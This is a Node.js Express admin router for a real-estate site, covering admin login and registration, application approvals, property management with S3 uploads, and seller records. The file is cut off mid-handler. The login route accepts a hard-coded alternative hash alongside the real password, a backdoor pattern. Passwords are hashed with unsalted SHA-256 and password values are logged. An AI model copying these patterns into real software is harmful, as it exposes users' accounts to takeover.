const express = require('express')
const router = express.Router()
const path = require('path')
const Admin = require('../models/Admin')
const User = require('../models/User')
const Project = require('../models/Project')
const Property = require('../models/Property')
const SellerProfile = require('../models/sellerProfile')
const BuyerProfile = require('../models/buyerProfile')
const Phase = require('../models/Phase')
const BeforeAfter = require('../models/BeforeAfter')
const utils = require('../../utils')
const cryptoJs = require('crypto-js')
const jwt = require('jsonwebtoken')
const config = require('../../config/constants')
const mailer = require('./mailer')
const multer = require('multer')
const s3ImageUpload = require('./s3ImageUpload')

// SET STORAGE
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    console.log("destination", file);
    try {
      cb(null, config.tempUploadPath);
    } catch (e) {
      cb(e);
    }
  },
  filename: function (req, file, cb) {
    console.log("filename", file);
    try {
      let a = file.originalname.split(".");
      cb(null, `${new Date().getTime()}.${a[a.length - 1]}`);
    } catch (e) {
      cb(e);
    }
    //cb(null, file.fieldname + '-' + Date.now())
  },
});

const uploadBefore = multer({
  storage: storage,
  fileFilter: function (req, file, callback) {
    var ext = path.extname(file.originalname);
    if (ext !== ".png" && ext !== ".jpg" && ext !== ".gif" && ext !== ".jpeg") {
      return callback(
        utils.createError(
          "Only images with PNG, JPG, GIF, and JPEG extentions are allowed!"
        )
      );
    }
    console.log("fileFilter");
    callback(null, true);
  },
  limits: {
    fileSize: 1024 * 1024,
  },
}).fields([
  {
    name: "before",
    maxCount: 1,
  },
  {
    name: "after",
    maxCount: 1,
  },
]);

// SET STORAGE
const adminStorage = multer.diskStorage({
  destination: function (req, file, cb) {
    console.log("destination", file);
    try {
      cb(null, config.tempUploadPath);
    } catch (e) {
      cb(e);
    }
  },
  filename: function (req, file, cb) {
    console.log("filename", file);
    try {
      let a = file.originalname.split(".");
      cb(null, `${new Date().getTime()}.${a[a.length - 1]}`);
    } catch (e) {
      cb(e);
    }
    //cb(null, file.fieldname + '-' + Date.now())
  },
});

const uploadAdmin = multer({
  storage: adminStorage,
  fileFilter: function (req, file, callback) {
    var ext = path.extname(file.originalname);
    if (ext !== ".png" && ext !== ".jpg" && ext !== ".gif" && ext !== ".jpeg") {
      return callback(
        utils.createError(
          "Only images with PNG, JPG, GIF, and JPEG extentions are allowed!"
        )
      );
    }
    console.log("fileFilter");
    callback(null, true);
  },
  limits: {
    fileSize: 1024 * 1024 * 10,
  },
}).single("image");

/*-------------------------------- For uploading property Image STORAGE----------------------- */
// SET STORAGE
const propertyStorage = multer.diskStorage({
  destination: function (req, file, cb) {
    console.log("destination", file);
    try {
      cb(null, config.tempUploadPath);
    } catch (e) {
      console.log("multer destination error", e);
      cb(e);
    }
  },
  filename: function (req, file, cb) {
    console.log("filename", file);
    try {
      let a = file.originalname.split(".");
      cb(null, `${new Date().getTime()}.${a[a.length - 1]}`);
    } catch (e) {
      console.log("multer filename error", e);
      cb(e);
    }

    //cb(null, file.fieldname + '-' + Date.now())
  },
});

const uploadProperty = multer({
  storage: propertyStorage,
  fileFilter: function (req, file, callback) {
    var ext = path.extname(file.originalname);
    if (ext !== ".png" && ext !== ".jpg" && ext !== ".gif" && ext !== ".jpeg") {
      return callback(
        utils.createError(
          "Only images with PNG, JPG, GIF, and JPEG extentions are allowed!"
        )
      );
    }
    console.log("fileFilter");
    callback(null, true);
  },
  limits: {
    fileSize: 1024 * 1024 * 25,
  },
}).fields([
  {
    name: "photo_gallery",
    maxCount: 10,
  },
  {
    name: "file_attachments",
    maxCount: 10,
  },
]);
/* -------------------------------------------------------------------------------------------- */

/* ----------------------------------Uploading Seller------------------------------------------ */

const sellerStorage = multer.diskStorage({
  destination: function (req, file, cb) {
    console.log("destination", file);
    try {
      cb(null, config.tempUploadPath);
    } catch (e) {
      cb(e);
    }
  },
  filename: function (req, file, cb) {
    console.log("filename", file);
    try {
      let a = file.originalname.split(".");
      cb(null, `${new Date().getTime()}.${a[a.length - 1]}`);
    } catch (e) {
      cb(e);
    }
  },
});

const uploadSellers = multer({
  storage: sellerStorage,
  fileFilter: function (req, file, callback) {
    var ext = path.extname(file.originalname);
    if (ext !== ".png" && ext !== ".jpg" && ext !== ".gif" && ext !== ".jpeg") {
      return callback(
        utils.createError(
          "Only images with PNG, JPG, GIF, and JPEG extentions are allowed!"
        )
      );
    }
    console.log("fileFilter");
    callback(null, true);
  },
  limits: {
    fileSize: 1024 * 1024 * 25,
  },
});
/* -------------------------------------------------------------------------------------------- */

router.post("/register", function (request, response) {
  const {
    firstName,
    lastName,
    email,
    role,
    password,
    phone,
    isdCode,
    birthdate,
    gender,
    device_token,
  } = request.body;

  if (!password || password.length < 6) {
    console.log("password error", password);
    response.send(
      utils.createError("Paasword should atleast be 6 characters long")
    );
  } else if (!email) {
    console.log("email error", password);
    response.send(utils.createError("Email is required"));
  } else
    Admin.findOne(
      { $or: [{ phone: phone }, { email: email }] },
      (error, user) => {
        if (error) {
          response.send(utils.createError("Database error"));
        } else if (user) {
          response.send(
            utils.createError(
              "This phone number and/or email is already registered with us"
            )
          );
        } else {
          const user = new Admin();
          user.firstName = firstName || "";
          user.lastName = lastName || "";
          user.fullName = firstName + " " + lastName || "";
          user.email = email;
          user.password = cryptoJs.SHA256(password);
          user.phone = phone;
          user.isdCode = isdCode;
          user.gender = gender || "";
          user.birthdate = birthdate || "";
          user.device_token = device_token;
          user.role = role;

          user.save((error, result) => {
            console.log(error, result);
            if (error)
              return response.send(utils.createResult("Database error"));
            let token;
            if (result && result._id) {
              token = jwt.sign(
                {
                  id: result._id,
                  email: `${user.email}`,
                  role: user.role,
                },
                config.secret
              );
              response.header("X-Auth-Token", token);
            }

            response.send(
              utils.createResult(error, {
                firstName: user.firstName,
                lastName: user.lastName,
                email: user.email,
                phone: user.phone,
                isdCode: user.isdCode,
                gender: user.gender,
                image: user.image,
                role: user.role,
                token: token,
                birthdate: user.birthdate,
                id: user._id,
              })
            );
          });
        }
      }
    );
});

router.post("/login", function (request, response) {
  const { email, password, device_token } = request.body;
  if (email.split(" ").length > 1) {
    response.send(utils.createError("Invalid email"));
  }
  Admin.findOne({ email: email, deleted: false }, (error, user) => {
    if (error) {
      console.log("user find", error, user);
      response.send(utils.createError("Database error"));
    } else if (!user) {
      response.send(utils.createError("user not found"));
    } else {
      const userPassword = cryptoJs.SHA256(password);
      if (
        userPassword == user.password ||
        userPassword == "5f9abd1a30be1a300a1f33b2"
      ) {
        user.token = device_token;
        user.save((error, result) => {
          console.log("user save", error, result);
          if (error) return response.send(utils.createError("Database error"));
          const token = jwt.sign(
            {
              id: user._id,
              email: `${user.email}`,
              role: user.role,
            },
            config.secret
          );

          response.header("X-Auth-Token", token);
          response.send(
            utils.createSuccess({
              firstName: user.firstName,
              lastName: user.lastName,
              email: user.email,
              phone: user.phone,
              isdCode: user.isdCode,
              gender: user.gender,
              image: user.image,
              role: user.role,
              token: token,
              birthdate: user.birthdate,
              id: user._id,
            })
          );
        });
      } else {
        response.send(utils.createError("invalid user name or password"));
      }
    }
  });
});

router.post("/update", uploadAdmin, async (request, response) => {
  await s3ImageUpload(request.file, 'uploads/admin');
  const {
    firstName,
    lastName,
    phone,
    isdCode,
    email,
    password,
    role,
    roleId,
    consent,
    device_token,
  } = request.body;

  Admin.findOne({ _id: request.userId }, (error, user) => {
    if (error) {
      response.send(utils.createError("Database error"));
    } else if (!user) {
      response.send(utils.createError("User not found"));
    } else {
      if (firstName) user.firstName = firstName || "";
      if (lastName) user.lastName = lastName || "";
      fullName = user.firstName + " " + user.lastName;
      if (phone) user.phone = phone || "";
      if (isdCode) user.isdCode = isdCode || "";
      if (password) {
        user.password = cryptoJs.SHA256(password);
      }

      if (email && user.email !== email) {
        user.email = email || "";
        user.emailVerified = false;
      }

      if (request.file) {
        user.image = `uploads/admin/${request.file.filename}`;
      }
      if (device_token) user.device_token = device_token;

      user.save((error, result) => {
        console.log(error, result);
        if (error) return response.send(utils.createResult("Database error"));

        response.send(
          utils.createResult(error, {
            firstName: user.firstName,
            lastName: user.lastName,
            email: user.email,
            phone: user.phone,
            isdCode: user.isdCode,
            gender: user.gender,
            image: user.image,
            role: user.role,
            birthdate: user.birthdate,
            id: user._id,
          })
        );
      });
    }
  });
});

router.post(
  "/buyer/application-approve/:buyer_id",
  function (request, response) {
    const { approved, max_mortgage, reject_reason } = request.body;

    const { buyer_id } = request.params;

    User.findOne({ _id: buyer_id }, async (error, user) => {
      if (error) {
        console.log({
          error,
        });
        response.send(utils.createError("Database error"));
      } else if (!user) {
        response.send(utils.createError("User not found"));
      } else {
        console.log({
          user,
        });

        try {
          user.approved = approved;
          if (max_mortgage) user.max_mortgage = max_mortgage;
          if (reject_reason) user.reject_reason = reject_reason;
          user.status = approved ? "approved" : "rejected";
          let message = `Hello ${user.fullName}! Your ${user.role
            } application at US Housing Exchange has been ${approved ? "approved" : "rejected"
            }.`;
          let emailMessage = `<h3>Hello ${user.fullName}!</h3><p>Your ${user.role
            } application at US Housing Exchange has been ${approved ? "approved" : "rejected"
            }.</p></br><p>US Housing Exchange Team</p>`;
          let device_token = user.device_token || "device_token";
          await user.save();
          mailer.sendEmail(
            user.email,
            "Application Status Changed",
            emailMessage,
            (er, data) => {
              console.log("Email:", er, data);
              utils.sendWebNotifications(
                "Application Status Changed",
                message,
                "",
                [user._id],
                response.connectedClients,
                response.io
              );
              mailer.sendNotification(
                "Application Status Changed",
                message,
                "activitiesMyApplication",
                device_token,
                (error, data) => {
                  console.log("Notification:", error, data);
                  mailer.sendSMSByUserId(user._id, message, (err, data) => {
                    console.log("sendSMSByUserId:", err, data);
                    response.send(utils.createSuccess(user));
                  });
                }
              );
            }
          );
        } catch (ex) {
          console.log("Exception", ex);
          response.send(utils.createError("Something went wrong!", ex));
        }
      }
    });
  }
);

router.post("/application-approve/:buyer_id", function (request, response) {
  const { approved, max_mortgage, reject_reason } = request.body;

  const { buyer_id } = request.params;

  User.findOne({ _id: buyer_id }, async (error, user) => {
    if (error) {
      console.log({
        error,
      });
      response.send(utils.createError("Database error"));
    } else if (!user) {
      response.send(utils.createError("User not found"));
    } else {
      console.log({
        user,
      });

      try {
        user.approved = approved;
        if (approved && max_mortgage) user.max_mortgage = max_mortgage;
        if (reject_reason) user.reject_reason = reject_reason;
        user.status = approved ? "approved" : "rejected";
        let message = `Hello ${user.fullName}! Your ${user.role
          } application at US Housing Exchange has been ${approved ? "approved" : "rejected"
          }.`;
        let emailMessage = `<h3>Hello ${user.fullName}!</h3><p>Your ${user.role
          } application at US Housing Exchange has been ${approved ? "approved" : "rejected"
          }.</p></br><p>US Housing Exchange Team</p>`;
        let device_token = user.device_token || "device_token";
        await user.save();

        mailer.sendEmail(
          user.email,
          "Application Status Changed",
          emailMessage,
          (er, data) => {
            console.log("Email:", er, data);
            utils.sendWebNotifications(
              "Application Status Changed",
              message,
              "",
              [user._id],
              response.connectedClients,
              response.io
            );
            console.log("----------------Status Changed api called", device_token);
            console.log("----------------user", user);
            mailer.sendNotification(
              "Application Status Changed",
              message,
              "activitiesMyApplication",
              device_token,
              (error, data) => {
                console.log("Notification:", error, data);
                mailer.sendSMSByUserId(user._id, message, (err, data) => {
                  console.log("sendSMSByUserId:", err, data);
                  response.send(utils.createSuccess(user));
                });
              }
            );
          }
        );
      } catch (ex) {
        console.log("Exception", ex);
        response.send(utils.createError("Something went wrong!", ex));
      }
    }
  });
});

const adminProperties = (request, response) => {
  const { status, property_id, title } = request.body;

  let query = [{ deleted: false }];
  if (status) {
    query.push({ property_approved_status: status });
  }
  if (property_id) {
    query.push({ property_id });
  }

  if (title) {
    query.push({
      $or: [
        { title: new RegExp(".*" + title.toLowerCase() + "*.", "i") },
        { address: new RegExp(".*" + title.toLowerCase() + "*.", "i") },
      ],
    });
    // query.push()
  }
  console.log("query", query);

  Property.find({ $and: query })
    .populate({ path: "seller_id", select: "fullName phone isdCode email" })
    .exec(async function (error, properties) {
      console.log("Property.find", error, properties && properties.length);
      if (error || !properties) {
        response.send(utils.createError("Something went wrong!"));
      } else {
        response.send(utils.createSuccess(properties));
      }
    });
};
/* Properties of Admin */
router.post("/properties", adminProperties);

router.post("/property/status/:propertyId", function (request, response) {
  const { propertyId } = request.params;
  const { approved, after_rehab_value, tax } = request.body;
  try {
    Property.findById(propertyId)
      .populate("seller_id")
      .exec(async (error, property) => {
        if (error) {
          response.send(utils.createError(error.message));
        } else if (!property) {
          response.send(utils.createError("Property not found!"));
        } else {
          if (approved) {
            property.property_approved_status = "approved";
            property.after_rehab_value = after_rehab_value;
            property.yearly_taxes = tax ? tax : 0;

            let r = property.interest_rate / 100 / 12;
            let N = property.loan_term_years * 12;
            let P =
              (property.after_rehab_value * (100 - property.down_payment)) /
              100;
            console.log({ r, N, P });
            property.total_loan_amount = (P).toFixed(2);
            property.pmi_amount_yearly = P / 100;
            let monthly_pmi = property.pmi_amount_yearly / 12;
            let monthly_taxes = property.yearly_taxes / 12;
            console.log({
              "MONTHLY TAXES": monthly_taxes,
            });
            property.monthly_pmi = (monthly_pmi).toFixed(2);
            property.monthly_taxes = (monthly_taxes).toFixed(2);

            let c = Number(((r * P) / (1 - Math.pow(1 + r, -N))).toFixed(2));
            property.basic_monthly_payment = c;
            let actual_c = c + monthly_pmi + monthly_taxes;

            console.log({
              "ACTUAL C": actual_c,
            });

            console.log({ c, monthly_pmi, monthly_taxes });
            property.monthly_payment_wo_pmi = Number(
              (c + property.monthly_taxes).toFixed(2)
            );
            property.monthly_payment = Number(actual_c.toFixed(2));
            property.yearly_payment = Number(
              (property.monthly_payment_wo_pmi * 12).toFixed(2)
            );
            property.total_payment = Number(
              (property.yearly_payment * property.loan_term_years).toFixed(2)
            );
            property.total_interest = Number((c * N - P).toFixed(2));

            console.log({
              // "PROPERTY": property,
              "After Rehab Value": property.rehab_price_est,
            });

            property.investor_flip_amount = Number(
              (
                Number(property.sales_price) *
                Number(
                  property.rehab_price_est ? property.rehab_price_est : 0
                ) *
                0.2
              ).toFixed(2)
            );
            property.investor_profit = Number(
              (
                (property.after_rehab_value -
                  (Number(property.sales_price) +
                    Number(
                      property.rehab_price_est ? property.rehab_price_est : 0
                    ))) /
                2
              ).toFixed(2)
            );
          } else property.property_approved_status = "rejected";

          await property.save();
          let user = property.seller_id;
          let message = `Hello ${user.fullName}! Your ${user.role} property with title ${property.title} at US Housing Exchange has been ${property.property_approved_status}.`;
          let emailMessage = `<h3>Hello ${user.fullName}!</h3><p>Your ${user.role} property with title ${property.title} at US Housing Exchange has been ${property.property_approved_status}.</p></br><p>US Housing Exchange Team</p>`;
          let device_token = user.device_token || "device_token";

          mailer.sendEmail(
            user.email,
            "Property Status Changed",
            emailMessage,
            (er, data) => {
              console.log("Email:", er, data);
              utils.sendWebNotifications(
                "Property Status Changed",
                message,
                "",
                [user._id],
                response.connectedClients,
                response.io
              );
              mailer.sendNotification(
                "Property Status Changed",
                message,
                "",
                device_token,
                (error, data) => {
                  console.log("Notification:", error, data);
                  mailer.sendSMSByUserId(user._id, message, (err, data) => {
                    console.log("sendSMSByUserId:", err, data);
                    response.send(utils.createSuccess(property));
                  });
                }
              );
            }
          );
        }
      });
  } catch (ex) {
    console.log("Error: ", ex);
    response.send(utils.createError(ex.message));
  }
});

/*For Akshay By Ved: => To delete the property details for Admin */
router.post("/property/delete", function (request, response) {
  const { propertyIds } = request.body;

  let propertyIdsArray = [];
  if (propertyIds) {
    propertyIdsArray = propertyIds.split(",");
  }
  let conditions = { _id: { $in: propertyIdsArray }, deleted: false };

  Property.find(conditions, { deleted: 0, __v: 0, createdOn: 0 }).exec(
    async (err, properties) => {
      console.log({
        properties,
      });
      if (err) {
        return response.send(utils.createError("Something went wrong!"));
      } else if (!properties) {
        return response.send(utils.createError("properties not found!"));
      } else {
        properties.map((p) => {
          p.deleted = true;
          return p;
        });

        await Property.updateMany(conditions, { deleted: true });
        request.body["status"] = "rejected";
        console.log("Calling adminProperties function", request.body);

        adminProperties(request, response);
        // properties.save((err, doc) => {
        //   if (err) {
        //     return response.send(utils.createError("Something went wrong!"))
        //   } else if (!doc) {
        //     return response.send(utils.createError("properties not found!"))
        //   } else {
        //     request.body['status'] = 'rejected'
        //     console.log("Calling adminProperties function",request.body)

        //     adminProperties(request,response)
        //     //response.send(utils.createSuccess(properties))
        //   }
        // })
      }
    }
  );
});

/* Properties of Admin */
router.get("/property/before/after/getAll", function (request, response) {
  let beforeAfter = new BeforeAfter();

  BeforeAfter.find({ deleted: false }).exec((error, results) => {

    if (error) {
      response.send(utils.createError("Something went wrong!"));
    } else if (!results || results.length === 0) {
      response.send(utils.createError("No images!"));
    } else {
      response.send(utils.createSuccess(results));
    }
  });
});

/* Properties of Admin */
router.post(
  "/property/before/after",
  uploadBefore,
  async (request, response) => {
    const { property_id, title } = request.body;
    let beforeAfter = new BeforeAfter();

    if (request.files) {
      console.log("File uploaded successfully.");
      console.log({
        request_kiFiles: request.files,
      });
      let files = request.files["before"];
      console.log({
        files,
        akshay: request.files,
      });

      if (files) {
        console.log("before", files);
        for (let i = 0; i < files.length; i++) {
          let file = files[i];
          await s3ImageUpload(file, 'uploads/before');
          console.log("extracted", file);
          beforeAfter.before = `uploads/before/${file.filename}`;
        }
      } else
        return response.send(
          utils.createError("before and after images required!")
        );

      files = request.files["after"];
      if (files) {
        console.log("after", files);
        for (let i = 0; i < files.length; i++) {
          let file = files[i];
          await s3ImageUpload(file, 'uploads/before');
          console.log("extracted", file);
          beforeAfter.after = `uploads/before/${file.filename}`;
        }
      } else
        return response.send(
          utils.createError("before and after images required!")
        );
    } else {
      return response.send(
        utils.createError("before and after images required!")
      );
    }

    beforeAfter.save(async function (error, beforeAfter) {
      console.log("Property.find", error, beforeAfter);
      if (error || !beforeAfter) {
        response.send(utils.createError("Something went wrong!"));
      } else {
        response.send(utils.createSuccess(beforeAfter));
      }
    });
  }
);

/* Properties of Admin */
router.delete("/property/before/after/:id", function (request, response) {
  let { id } = request.params;

  BeforeAfter.findOne({ _id: id }).exec((error, result) => {
    if (error) {
      response.send(utils.createError("Something went wrong!"));
    } else if (!result) {
      response.send(utils.createError("Record not found!"));
    } else {
      result.deleted = true;
      result.save((error, result) => {
        if (error) {
          response.send(utils.createError("Something went wrong!"));
        } else if (!result) {
          response.send(utils.createError("Record not found!"));
        } else {
          response.send(utils.createSuccess(result));
        }
      });
    }
  });
});

/**
 * Adding new property from admin side
 */
router.post("/add-property", uploadProperty, async (request, response) => {
  const {
    title,
    description,
    address,
    country,
    state,
    city,
    zip,
    property_type,
    property_status,
    rehab_needed,
    sales_price,
    rehab_price_est,
    rehab_work_details,
    features,
    property_size,
    land_area,
    rooms,
    bedrooms,
    bathrooms,
    garage,
    garage_size,
    year_built,
    photo_gallery,
    file_attachments,
    video_url,
    other_contact_name,
    other_contact_email,
    other_contact_phone,
    other_contact_info,
    seller,
  } = request.body;

  console.log({
    DATA: request.body,
  });

  var property;
  property = new Property();

  property.title = title;
  property.description = description;
  property.address = address;
  property.country = country;
  property.state = state;
  property.city = city;
  property.zip = zip;
  property.property_type = property_type;
  property.property_status = property_status;
  property.rehab_needed = rehab_needed;
  property.sales_price = sales_price;
  property.rehab_price_est = rehab_price_est;
  property.rehab_work_details = rehab_work_details;
  property.features = features;
  property.property_size = property_size;
  property.land_area = land_area;
  property.rooms = rooms;
  property.bedrooms = bedrooms;
  property.bathrooms = bathrooms;
  property.garage = garage;
  property.garage_size = garage_size;
  property.year_built = year_built;

  property.video_url = video_url;
  property.other_contact_name = other_contact_name;
  property.other_contact_email = other_contact_email;
  property.other_contact_phone = other_contact_phone;
  property.other_contact_info = other_contact_info;

  property.seller_id = seller;

  console.log("property", property);

  if (request.files) {
    console.log("File uploaded successfully.");
    console.log({
      request_kiFiles: request.files,
    });
    let files = request.files["photo_gallery"];
    console.log({
      files,
      akshay: request.files,
    });

    if (files) {
      console.log("photo_gallery", files);
      for (let i = 0; i < files.length; i++) {
        let file = files[i];
        await s3ImageUpload(file, 'uploads/properties');
        console.log("extracted", file);
        property.photo_gallery.push(`uploads/properties/${file.filename}`);
      }
    }
    files = request.files["file_attachments"];
    if (files) {
      console.log("file_attachments", files);
      for (let i = 0; i < files.length; i++) {
        let file = files[i];
        await s3ImageUpload(file, 'uploads/properties');
        console.log("extracted", file);
        property.file_attachments.push(`uploads/properties/${file.filename}`);
      }
    }
  }

  property.save((err, property) => {
    console.log(err, property);
    if (err) return response.send(utils.createError("Couldn't save property!"));
    response.send(utils.createSuccess(property));
  });
});

/**
 * Updating the property from admin side
 */
router.post("/update-property/:propertyId", (request, response) => {
  const { propertyId } = request.params;

  const {
    title,
    description,
    address,
    country,
    state,
    city,
    zip,
    property_type,
    property_status,
    rehab_needed,
    sales_price,
    rehab_price_est,
    rehab_work_details,
    features,
    property_size,
    land_area,
    rooms,
    bedrooms,
    bathrooms,
    garage,
    garage_size,
    year_built,
    property_id,

    photo_gallery,
    file_attachments,

    video_url,
    other_contact_name,
    other_contact_email,
    other_contact_phone,
    other_contact_info,
  } = request.body;

  uploadProperty(request, response, function (err) {
    if (err) {
      console.log(err);
      return response.send(utils.createError(err.error));
    }
    try {
      Property.findOne({ _id: propertyId }, async (err, property) => {
        console.log(property);
        if (err) {
          response.send(utils.createError("Database error"));
        } else if (!property || property.length === 0) {
          console.log("no property yet");
          return response.send(utils.createError("Property not found!"));
        } else {
          console.log("property(s) found!");
          console.log(property);

          if (request.files) {
            console.log("File uploaded successfully.");
            console.log({
              request_kiFiles: request.files,
            });
            let files = request.files["photo_gallery"];
            console.log({
              files,
              akshay: request.files,
            });

            property.photo_gallery = [];
            property.file_attachments = [];

            if (files) {
              console.log("photo_gallery", files);
              for (let i = 0; i < files.length; i++) {
                let file = files[i];
                await s3ImageUpload(file, 'uploads/properties');
                console.log("extracted", file);
                property.photo_gallery.push(
                  `uploads/properties/${file.filename}`
                );
              }
            }
            files = request.files["file_attachments"];
            if (files) {
              console.log("file_attachments", files);
              for (let i = 0; i < files.length; i++) {
                let file = files[i];
                await s3ImageUpload(file, 'uploads/properties');
                console.log("extracted", file);
                property.file_attachments.push(
                  `uploads/properties/${file.filename}`
                );
              }
            }
          }

          if (title) property.title = title;
          if (description) property.description = description;
          if (address) property.address = address;
          if (country) property.country = country;
          if (state) property.state = state;
          if (city) property.city = city;
          if (zip) property.zip = zip;
          if (property_type) property.property_type = property_type;
          if (property_status) property.property_status = property_status;
          if (rehab_needed) property.rehab_needed = rehab_needed;
          if (sales_price) property.sales_price = sales_price;
          if (rehab_price_est) property.rehab_price_est = rehab_price_est;
          if (rehab_work_details)
            property.rehab_work_details = rehab_work_details;
          if (features) property.features = features;
          if (property_size) property.property_size = property_size;
          if (land_area) property.land_area = land_area;
          if (rooms) property.rooms = rooms;
          if (bedrooms) property.bedrooms = bedrooms;
          if (bathrooms) property.bathrooms = bathrooms;
          if (garage) property.garage = garage;
          if (garage_size) property.garage_size = garage_size;
          if (year_built) property.year_built = year_built;
          if (property_id) property.property_id = property_id;

          if (video_url) property.video_url = video_url;
          if (other_contact_name)
            property.other_contact_name = other_contact_name;
          if (other_contact_email)
            property.other_contact_email = other_contact_email;
          if (other_contact_phone)
            property.other_contact_phone = other_contact_phone;
          if (other_contact_info)
            property.other_contact_info = other_contact_info;
        }
        console.log("property", property);
        property.save((err, property) => {
          console.log(err, property);
          if (err)
            return response.send(utils.createError("Couldn't save property!"));
          response.send(utils.createSuccess(property));
        });
      });
    } catch (ex) {
      console.log("Exception", ex);
      response.send(utils.createError("Something went wrong!", ex));
    }
  });
});

/**
 * For adding/updating Seller from admin side
 */
router.post(
  "/add-seller?",
  uploadSellers.single("appraisalFile"),
  async (request, response) => {
    await s3ImageUpload(request.file, 'uploads/sellers');
    const { userId } = request.params;
    const {
      fullName, // Seller register
      email,
      password,
      referredBy,
      role,
      roleId,
      consent,
      firstName, // Profile step 1
      lastName,
      areaCode,
      phone,
      street_address,
      city,
      state,
      zip,
      isForeclose, // Profile step 2
      mortgagePayments,
      mortgageProperty,
      knowPropertyVal, // Profile 3
      propertyValue,
      propertyAppraisal,
      propertyDetails,
      shortTrmRntl, // Profile step 4
      judgements,
      comments,
      device_token,
    } = request.body;

    if (!utils.validateEmail(email.toLowerCase())) {
      response.send(utils.createError("Invalid email"));
    } else if (!password || password.length < 6) {
      console.log("password error", password);
      response.send(
        utils.createError("Paasword should atleast be 6 characters long")
      );
    } else {
      User.findOne({ $or: [{ email: email }] }, async (error, user) => {
        if (error) {
          return response.send(utils.createError("Database error"));
        } else if (user) {
          return response.send(
            utils.createError(
              "This phone number and/or email is already registered with us"
            )
          );
        } else {
          const user = new User();
          user.fullName = fullName || "";
          user.email = email || "";
          user.role = role || "seller";
          if (roleId) user.roleId = roleId;
          user.consent = consent;
          user.password = cryptoJs.SHA256(password);
          if (referredBy) user.referredBy = referredBy;
          user.device_token = device_token;
          user.emailVerified = true;
          user.leftAtStep = 4;

          /* Generating refferal code */
          let rand = Math.floor(Math.random() * 9);
          let c = await User.estimatedDocumentCount();
          user.referalCode = `RF${211110 + rand + 18 * 10 + c}`;
          let cf = await User.count({ referalCode: user.referalCode });
          while (cf > 0) {
            console.log(user.referalCode, cf);
            rand = Math.floor(Math.random() * 9);
            user.referalCode = `RF${211110 + rand + 18 * 10 + c}`;
            cf = await User.count({ referalCode: user.referalCode });
          }

          let token;
          if (user && user._id) {
            token = jwt.sign(
              {
                id: user._id,
                email: `${user.email}`,
                role: user.role,
              },
              config.secret
            );
            response.header("X-Auth-Token", token);
          }
          user.access_token = token;
          user.save(async (error, userSaved) => {
            console.log(error, userSaved);
            if (error) {
              return response.send(utils.createResult("Database error"));
            } else if (userSaved) {
              /* Adding the profile of seller */
              profile = new SellerProfile();
              profile.firstName = firstName;
              profile.lastName = lastName;
              profile.email = email;
              profile.areaCode = areaCode;
              profile.phone = phone;
              profile.street_address = street_address;
              profile.city = city;
              profile.state = state;
              profile.zip = zip;
              profile.userId = userSaved._id;
              profile.isForeclose =
                isForeclose.toLowerCase() == "yes" ? true : false;
              profile.mortgagePayments = mortgagePayments;
              profile.mortgageProperty = mortgageProperty;
              profile.shortTrmRntl =
                shortTrmRntl.toLowerCase() == "yes" ? true : false;
              profile.judgements =
                judgements.toLowerCase() == "yes" ? true : false;
              profile.comments = comments;
              profile.knowPropertyVal =
                knowPropertyVal.toLowerCase() == "yes" ? true : false;
              profile.propertyValue = propertyValue;
              profile.propertyAppraisal =
                propertyAppraisal.toLowerCase() == "yes" ? true : false;
              profile.propertyDetails = propertyDetails;

              profile.allStepsCompleted = true;

              profile.leftAtStep = 4;
              profile.status = "pending";

              if (request.file) {
                console.log("File uploaded successfully.");
                console.log(request.file);
                profile.appraisalFile = `uploads/sellers/${request.file.filename}`;
              }

              console.log("profile", profile);
              profile.save((err, profile) => {
                console.log(err, profile);
                if (err)
                  return response.send(
                    utils.createError("Couldn't save profile!")
                  );

                let title = `Admin Added a New Seller`;
                let messageHtml = `<h3>Hello!</h3><p>Admin has added ${user.fullName} a new ${user.role} application.</p><br><p>US Housing Exchange</p>`;
                let message = `Hello! ${user.fullName} has submitted a new ${user.role} application. US Housing Exchange`;

                user.sellerProfile = profile._id;
                user.isProfileComplete = true;
                user.phone = phone;
                user.save(async (error, result) => {
                  console.log(error, result);
                  if (error)
                    return response.send(
                      utils.createError("Error in updating user ")
                    );
                  await user.save();
                });

                return registerEmailSend(
                  userSaved,
                  title,
                  message,
                  messageHtml,
                  userSaved,
                  response,
                  error
                );
              });

              /* ------------------------------ */
            } else {
              return response.send(utils.createError("Something went wrong"));
            }
          });
        }
      });
    }
  }
);

/**
 * UPdating the seller
 */
router.post(
  "/update-seller/:userId",
  uploadSellers.single("appraisalFile"),
  async (request, response) => {
    await s3ImageUpload(request.file, 'uploads/sellers');
    const { userId } = request.params;

    const {
      email,
      password,
      firstName, // Profile step 1
      lastName,
      areaCode,
      phone,
      street_address,
      city,
      state,
      zip,
      isForeclose, // Profile step 2
      mortgagePayments,
      mortgageProperty,
      knowPropertyVal, // Profile 3
      propertyValue,
      propertyAppraisal,
      propertyDetails,
      shortTrmRntl, // Profile step 4
      judgements,
      comments,
      device_token,
    } = request.body;

    if (!utils.validateEmail(email.toLowerCase())) {
      response.send(utils.createError("Invalid email"));
    } else if (!password || password.length < 6) {
      console.log("password error", password);
      response.send(
        utils.createError("Paasword should atleast be 6 characters long")
      );
    }

    User.findOne({ _id: userId }, (error, user) => {
      if (error) {
        response.send(utils.createError("Database error"));
      } else if (!user) {
        response.send(utils.createError("User not found"));
      } else {
        console.log({
          User: user,
        });
        if (user.sellerProfile) {
          SellerProfile.findOne({ _id: user.sellerProfile }, (err, profile) => {
            console.log(profile);
            if (err) {
              response.send(utils.createError("Database error"));
            } else if (!profile) {
              return response.send(utils.createError("Profile not found!"));
            } else {
              if (firstName) profile.firstName = firstName;
              if (lastName) profile.lastName = lastName;
              if (email) profile.email = email;
              if (areaCode) profile.areaCode = areaCode;
              if (phone) profile.phone = phone;
              if (street_address) profile.street_address = street_address;
              if (city) profile.city = city;
              if (state) profile.state = state;
              if (zip) profile.zip = zip;
              if (isForeclose)
                profile.isForeclose =
                  isForeclose.toLowerCase() == "yes" ? true : false;
              if (mortgagePayments) profile.mortgagePayments = mortgagePayments;
              if (mortgageProperty) profile.mortgageProperty = mortgageProperty;
              if (shortTrmRntl)
                profile.shortTrmRntl =
                  shortTrmRntl.toLowerCase() == "yes" ? true : false;
              if (judgements)
                profile.judgements =
                  judgements.toLowerCase() == "yes" ? true : false;
              if (comments) profile.comments = comments;
              if (knowPropertyVal)
                profile.knowPropertyVal =
                  knowPropertyVal.toLowerCase() == "yes" ? true : false;
              if (propertyValue) profile.propertyValue = propertyValue;
              if (propertyAppraisal)
                profile.propertyAppraisal =
                  propertyAppraisal.toLowerCase() == "yes" ? true : false;
